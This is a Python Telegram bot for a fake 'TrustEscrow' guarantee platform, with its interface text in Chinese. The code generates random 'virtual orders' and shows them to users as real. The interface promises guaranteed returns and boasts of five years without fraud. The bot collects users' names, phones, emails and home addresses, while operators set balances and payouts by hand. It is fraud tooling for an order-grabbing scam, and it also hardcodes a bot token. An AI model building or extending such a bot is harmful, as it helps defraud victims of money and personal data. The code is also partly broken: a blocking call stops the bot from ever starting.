# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re
import random
import time
import threading

# ===================== 核心配置 =====================
BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
ADMIN_IDS = [8781082053, 8256055083]
VIRTUAL_ORDER_REFRESH_SECONDS = 120
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 虚拟订单 =====================
virtual_orders = []

def refresh_virtual_orders():
    global virtual_orders
    while True:
        virtual_orders = []
        for i in range(6):
            vid = 80000 + i
            amt = round(random.uniform(10, 100), 2)
            virtual_orders.append({"id": vid, "amount": amt})
        time.sleep(VIRTUAL_ORDER_REFRESH_SECONDS)

threading.Thread(target=refresh_virtual_orders, daemon=True).start()
refresh_virtual_orders()

# ===================== 文案 =====================
TEXT = {
    "zh": {
        "home": """🏆 TrustEscrow 頂級擔保平台
安全交易 · 穩定收益 · 零風險保障

✅ 5年零詐騙實績
✅ 專業中間人墊資
✅ 資金全程託管
✅ 搶單5%穩定收益
✅ 派單15%-20%高額回報

客服：@fcff88""",

        "reg_form": """📝 入駐擔保申請
請依序填寫真實信息：
1. 真實姓名
2. 聯絡電話
3. 電子信箱
4. 居住地址
5. 推薦人ID""",

        "reg_success": "✅ 入駐申請已提交，等待管理員審核",
        "reg_error": "❌ 格式錯誤，請按要求一次性發送完整5項信息",

        "profile": """👤 個人中心
🆔 用戶ID：{}
💰 餘額：{:.2f} USDT
📌 狀態：{}

⏳ 未完成訂單：
{}
✅ 已完成訂單：
{}""",

        "grab": """🚀 搶單大廳（每2分鐘自動刷新）
點擊「搶單」按鈕獲取真實訂單：

{}""",

        "grab_success": "✅ 搶單成功，請接單",
        "grab_already_gone": "❌ 訂單已被搶走",

        "deposit": """💰 儲值 & 提現
請聯繫官方客服：
➡️ @fcff88""",

        "record": """📜 擔保記錄
{}""",

        "account_detail": """📋 賬號明細
🆔 用戶ID：{}
👤 真實姓名：{}
📞 聯絡電話：{}
📧 電子信箱：{}
🏠 居住地址：{}
👥 推薦人ID：{}
💰 當前餘額：{:.2f} USDT
📌 審核狀態：{}""",

        "status_wait": "待接單",
        "status_doing": "已接單",
        "status_done": "已完成",

        "accept_success": "✅ 接單成功，已扣除金額",
        "not_enough": "❌ 餘額不足",
        "not_verified": "❌ 未通過審核",
        "no_detail": "❌ 你尚未填寫入駐信息",

        "btn_back": "返回首頁",
        "btn_accept": "接單",
        "btn_grab": "搶單"
    },
    "en": {
        "home": """🏆 TrustEscrow Premium Platform
Safe, Stable, Secure""",
        "reg_form": """📝 Escrow Registration""",
        "reg_success": "✅ Application Submitted",
        "reg_error": "❌ Format Error",
        "profile": """👤 Profile""",
        "grab": """🚀 Grab Hall""",
        "deposit": """💰 Deposit""",
        "record": """📜 Record""",
        "account_detail": """📋 Account Detail""",
        "status_wait": "Pending",
        "status_doing": "Accepted",
        "status_done": "Completed",
        "accept_success": "✅ Accepted",
        "not_enough": "❌ Not enough",
        "not_verified": "❌ Not verified",
        "no_detail": "❌ No info",
        "btn_back": "Home",
        "btn_accept": "Accept",
        "btn_grab": "Grab"
    }
}

# ===================== 数据 =====================
user_lang = {}
user_balance = {}
user_verify = {}
user_info = {}
orders = {}
order_id = 1
last_msg = {}
user_applying = {}

# ===================== 菜单 =====================
def main_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("入駐擔保" if lang == "zh" else "Register", callback_data="reg"),
        InlineKeyboardButton("個人中心" if lang == "zh" else "Profile", callback_data="profile"),
        InlineKeyboardButton("賬號明細" if lang == "zh" else "Account Detail", callback_data="detail"),
        InlineKeyboardButton("搶單大廳" if lang == "zh" else "Grab", callback_data="grab"),
        InlineKeyboardButton("儲值提現" if lang == "zh" else "Deposit", callback_data="deposit"),
        InlineKeyboardButton("擔保記錄" if lang == "zh" else "Record", callback_data="record"),
        InlineKeyboardButton("🌐 English" if lang == "zh" else "🌐 繁中", callback_data="lang"),
    )
    return m

def back_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(TEXT[lang]["btn_back"], callback_data="home"))
    return m

def accept_btn(oid, user_id):
    lang = user_lang.get(user_id, "zh")
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(TEXT[lang]["btn_accept"], callback_data=f"acc_{oid}"))
    m.add(InlineKeyboardButton(TEXT[lang]["btn_back"], callback_data="profile"))
    return m

# ===================== 通知 =====================
def notify_admins(text):
    for admin in ADMIN_IDS:
        try:
            bot.send_message(admin, text)
        except:
            pass

# ===================== start =====================
@bot.message_handler(commands=["start"])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    user_info.setdefault(u, {})
    user_applying[u] = False
    lang = user_lang[u]
    sent = bot.send_message(u, TEXT[lang]["home"], reply_markup=main_menu(u))
    last_msg[u] = sent.message_id

# ===================== 回调 =====================
@bot.callback_query_handler(func=lambda c: True)
def callback(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    mid = c.message.message_id
    cid = c.message.chat.id
    last_msg[u] = mid

    try:
        if c.data == "home":
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            t = TEXT[user_lang[u]]
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "reg":
            if user_verify.get(u, 0) != 0:
                bot.answer_callback_query(c.id, "已提交或已通過", show_alert=True)
                return
            user_applying[u] = True
            bot.edit_message_text(t["reg_form"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "detail":
            info = user_info.get(u, {})
            if not info:
                bot.edit_message_text(t["no_detail"], cid, mid, reply_markup=back_menu(u))
                return
            name = info.get("name", "-")
            phone = info.get("phone", "-")
            email = info.get("email", "-")
            addr = info.get("addr", "-")
            ref = info.get("ref", "-")
            bal = user_balance.get(u, 0.0)
            v = user_verify.get(u, 0)
            status = ["未申請","審核中","已通過"][v]
            text = t["account_detail"].format(u, name, phone, email, addr, ref, bal, status)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        elif c.data == "profile":
            pending = []
            completed = []
            for oid, o in orders.items():
                if o["user"] == u:
                    typ = "派單" if o["type"] == "assign" else "搶單"
                    s = [t["status_wait"],t["status_doing"],t["status_done"]][o["status"]]
                    line = f"• #{oid} {typ} {o['amount']} USDT | {s}"
                    if o["status"] == 2:
                        completed.append(line)
                    else:
                        pending.append(line)
            v = user_verify.get(u,0)
            status = ["未申請","審核中","已通過"][v]
            p_text = "\n".join(pending) if pending else "無"
            c_text = "\n".join(completed) if completed else "無"
            text = t["profile"].format(u, user_balance.get(u,0), status, p_text, c_text)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        elif c.data == "grab":
            if user_verify.get(u,0) != 2:
                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            items = []
            m = InlineKeyboardMarkup(row_width=1)
            for vo in virtual_orders:
                items.append(f"🔹 訂單 {vo['id']} ｜ {vo['amount']} USDT")
                m.add(InlineKeyboardButton(f"搶單 {vo['id']}", callback_data=f"grab_{vo['id']}"))
            m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
            bot.edit_message_text(t["grab"].format("\n".join(items)), cid, mid, reply_markup=m)

        elif c.data.startswith("grab_"):
            if user_verify.get(u,0) != 2:
                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            vid = int(c.data.split("_")[1])
            hit = next((x for x in virtual_orders if x["id"] == vid), None)
            if not hit:
                bot.send_message(u, t["grab_already_gone"])
                return
            global order_id
            oid = order_id
            order_id += 1
            orders[oid] = {"user": u, "amount": hit["amount"], "type": "grab", "status": 0}
            bot.edit_message_text(t["grab_success"], cid, mid, reply_markup=accept_btn(oid, u))

        elif c.data.startswith("acc_"):
            oid = int(c.data.split("_")[1])
            o = orders.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot.answer_callback_query(c.id, "無效訂單", show_alert=True)
                return
            if user_balance.get(u,0) < o["amount"]:
                bot.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            user_balance[u] -= o["amount"]
            o["status"] = 1
            bot.edit_message_text(t["accept_success"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "deposit":
            bot.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "record":
            lines = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = [t["status_wait"],t["status_doing"],t["status_done"]][o["status"]]
                    typ = "派單" if o["type"] == "assign" else "搶單"
                    lines.append(f"• #{oid} {typ} {o['amount']} USDT | {s}")
            text = t["record"].format("\n".join(lines) if lines else "無記錄")
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(e)
        bot.answer_callback_query(c.id)

# ===================== 用户申请 =====================
@bot.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS)
def handle_user(msg):
    u = msg.from_user.id
    if not user_applying.get(u, False):
        return
    txt = msg.text.strip()
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]

    pattern = r"1\..*?姓名\s*(.+?)\s*2\..*?電話\s*(.+?)\s*3\..*?信箱\s*(.+?)\s*4\..*?地址\s*(.+?)\s*5\..*?推薦人\s*(.+)"
    match = re.search(pattern, txt, re.DOTALL)
    if match:
        name = match.group(1).strip()
        phone = match.group(2).strip()
        email = match.group(3).strip()
        addr = match.group(4).strip()
        ref = match.group(5).strip()
        user_info[u] = {"name":name,"phone":phone,"email":email,"addr":addr,"ref":ref}
        user_verify[u] = 1
        user_applying[u] = False
        notify_admins(f"新申請｜{u}\n{name}｜{phone}")
        bot.send_message(u, t["reg_success"])
    else:
        bot.send_message(u, t["reg_error"])

# ===================== 管理员命令 =====================
@bot.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS)
def handle_admin(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    arr = txt.split()

    try:
        # 通过 ID
        if len(arr) >= 2 and arr[0] in ["通过","审核通过","通过审核"]:
            target = int(arr[1])
            user_verify[target] = 2
            bot.send_message(u, f"✅ 已通过 {target}")
            return

        # 查ID ID
        if len(arr) >= 2 and arr[0] == "查ID":
            target = int(arr[1])
            info = user_info.get(target, {})
            bal = user_balance.get(target, 0.0)
            v = user_verify.get(target, 0)
            status = ["未申请","审核中","已通过"][v]
            text = f"📋 用户 {target}\n姓名：{info.get('name','-')}\n电话：{info.get('phone','-')}\n邮箱：{info.get('email','-')}\n地址：{info.get('addr','-')}\n推荐人：{info.get('ref','-')}\n余额：{bal:.2f}\n状态：{status}"
            bot.send_message(u, text)
            return

        # +U ID 金额
        if txt.startswith("+U "):
            _, uid, amt = txt.split()
            uid = int(uid)
            amt = float(amt)
            user_balance[uid] = user_balance.get(uid, 0.0) + amt
            bot.send_message(u, f"✅ +{amt:.2f} → {uid} 余额：{user_balance[uid]:.2f}")
            return

        # -U ID 金额
        if txt.startswith("-U "):
            _, uid, amt = txt.split()
            uid = int(uid)
            amt = float(amt)
            user_balance[uid] = max(0.0, user_balance.get(uid,0.0) - amt)
            bot.send_message(u, f"✅ -{amt:.2f} → {uid} 余额：{user_balance[uid]:.2f}")
            return

        # 派单 ID 金额
        if arr[0] == "派单" and len(arr)==3:
            target = int(arr[1])
            amt = float(arr[2])
            global order_id
            oid = order_id
            order_id +=1
            orders[oid] = {"user":target,"amount":amt,"type":"assign","status":0}
            bot.send_message(u, f"✅ 派单 {oid} → {target}")
            return

        # 完成 订单号
        if arr[0] == "完成" and len(arr)==2:
            oid = int(arr[1])
            o = orders.get(oid)
            if not o:
                bot.send_message(u, "❌ 订单不存在")
                return
            o["status"] = 2
            profit = o["amount"] * (random.uniform(0.15,0.20) if o["type"]=="assign" else 0.05)
            user_balance[o["user"]] += o["amount"] + profit
            bot.send_message(u, f"✅ 订单 {oid} 完成")
            return

        bot.send_message(u, "指令：\n通过 ID\n查ID ID\n+U ID 金额\n-U ID 金额\n派单 ID 金额\n完成 订单号")
    except:
        bot.send_message(u, "❌ 格式错误")

# ===================== 启动 =====================
print("机器人已启动")
bot.infinity_polling()
